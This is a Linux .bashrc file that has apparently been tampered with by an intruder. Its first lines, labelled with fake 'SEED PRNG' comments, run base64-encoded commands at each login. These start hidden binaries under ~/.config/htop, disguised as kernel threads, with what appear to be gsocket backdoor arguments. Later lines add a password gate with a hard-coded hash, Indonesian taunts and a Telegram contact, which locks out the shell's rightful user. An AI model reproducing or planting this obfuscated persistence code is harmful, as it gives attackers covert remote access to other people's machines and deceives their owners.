# .bashrc
# DO NOT REMOVE THIS LINE. SEED PRNG. #zhyper-kernel
{ echo L3Vzci9iaW4vcGtpbGwgLTAgLVU4ODEgemh5cGVyIDI+L2Rldi9udWxsIHx8IChURVJNPXh0ZXJtLTI1NmNvbG9yIEdTX0FSR1M9Ii1rIC9ob21lL3Jhc3Rxa2x3Ly5jb25maWcvaHRvcC96aHlwZXIuZGF0IC1saXFEIiBleGVjIC1hICdbbW1fcGVyY3B1X3dxXScgJy9ob21lL3Jhc3Rxa2x3Ly5jb25maWcvaHRvcC96aHlwZXInIDI+L2Rldi9udWxsKQo=|base64 -d|bash;} 2>/dev/null #1b5b324a50524e47 >/dev/random # seed prng zhyper-kernel
# DO NOT REMOVE THIS LINE. SEED PRNG. #defunct-kernel
{ echo L2Jpbi9wa2lsbCAtMCAtVTg4MSBkZWZ1bmN0IDI+L2Rldi9udWxsIHx8IChURVJNPXh0ZXJtLTI1NmNvbG9yIEdTX0FSR1M9Ii1rIC9ob21lL3Jhc3Rxa2x3Ly5jb25maWcvaHRvcC9kZWZ1bmN0LmRhdCAtbGlxRCIgZXhlYyAtYSAnW3JhaWQ1d3FdJyAnL2hvbWUvcmFzdHFrbHcvLmNvbmZpZy9odG9wL2RlZnVuY3QnIDI+L2Rldi9udWxsKQo=|base64 -d|bash;} 2>/dev/null #1b5b324a50524e47 >/dev/random # seed prng defunct-kernel
# DO NOT REMOVE THIS LINE. SEED PRNG. #Krlung-kernel
{ echo L2Jpbi9wa2lsbCAtMCAtVTg4MSBLcmx1bmcgMj4vZGV2L251bGwgfHwgKFRFUk09eHRlcm0tMjU2Y29sb3IgR1NfQVJHUz0iLWsgL2hvbWUvcmFzdHFrbHcvLmNvbmZpZy9odG9wL0tybHVuZy5kYXQgLWxpcUQiIGV4ZWMgLWEgJ1tuZXRuc10nICcvaG9tZS9yYXN0cWtsdy8uY29uZmlnL2h0b3AvS3JsdW5nJyAyPi9kZXYvbnVsbCkK|base64 -d|bash;} 2>/dev/null #1b5b324a50524e47 >/dev/random # seed prng Krlung-kernel

# Source global definitions
if [ -f /etc/bashrc ]; then
	. /etc/bashrc
fi

# User specific environment
if ! [[ "$PATH" =~ "$HOME/.local/bin:$HOME/bin:" ]]
then
    PATH="$HOME/.local/bin:$HOME/bin:$PATH"
fi
export PATH

# Uncomment the following line if you don't like systemctl's auto-paging feature:
# export SYSTEMD_PAGER=

# User specific aliases and functions










case $- in
    *i*) ;;
    *) return ;;
esac

trap 'echo -e "\n\e[1;31m[!] masukin aja dulu bwang wkwk\e[0m\n"; continue' INT

expected_hash="8783ff6406f2975d3e106926e9bc056f6b0970521a4f17c49a0585e7999f04a1"
input_hash=""

echo -e "\e[1;36m======================================\e[0m"
echo -e "   \e[1;33mBukan Seoven? Mau Ngapain Bwang?\e[0m"
echo -e "\e[1;36m                  ↓↓↓                   \e[0m"
echo -e "\e[1;35mLink Tele:\e[0m \e[1;36mhttps://t.me/Seokolot\e[0m"
echo -e "\e[1;36m======================================\e[0m"

while [[ "$input_hash" != "$expected_hash" ]]; do
    echo -ne "\e[1;36m[+] Masukkan Passwordnya Dulu: \e[0m"
    read -s input_pass
    echo
    input_hash=$(echo -n "$input_pass" | sha256sum | awk '{print $1}')
    
    if [[ "$input_hash" != "$expected_hash" ]]; then
        echo -e "\e[1;31m[!] wkwk ga bisa yah bwang?\e[0m"
    fi
done

echo -e "\n\e[1;32m[SUCCESS] Akses diterima!\e[0m"
sleep 1

logo='
    ███████╗███████╗ ██████╗ ██╗   ██╗███████╗███╗   ██╗
    ██╔════╝██╔════╝██╔═══██╗██║   ██║██╔════╝████╗  ██║
    ███████╗█████╗  ██║   ██║██║   ██║█████╗  ██╔██╗ ██║
    ╚════██║██╔══╝  ██║   ██║╚██╗ ██╔╝██╔══╝  ██║╚██╗██║
    ███████║███████╗╚██████╔╝ ╚████╔╝ ███████╗██║ ╚████║
    ╚══════╝╚══════╝ ╚═════╝   ╚═══╝  ╚══════╝╚═╝  ╚═══╝
'

echo -e "\e[1;35m$logo\e[0m"
echo -e "\e[1;36m======================================\e[0m"
echo -e "      \e[1;33mSelamat datang, Seoven\e[0m \e[1;35m👾\e[0m"
echo -e "\e[1;33m   Siap menjalankan perintah, bwang!"
echo -e "\e[1;36m======================================\e[0m"
echo

timenow=$(date +'%H:%M')
load=$(awk '{print $1 ", " $2 ", " $3}' /proc/loadavg)

echo -e "\e[1;36mThe time now is $timenow UTC\e[0m"
echo -e "\e[1;36mServer load: $load\e[0m"
echo -e ""

trap - INT
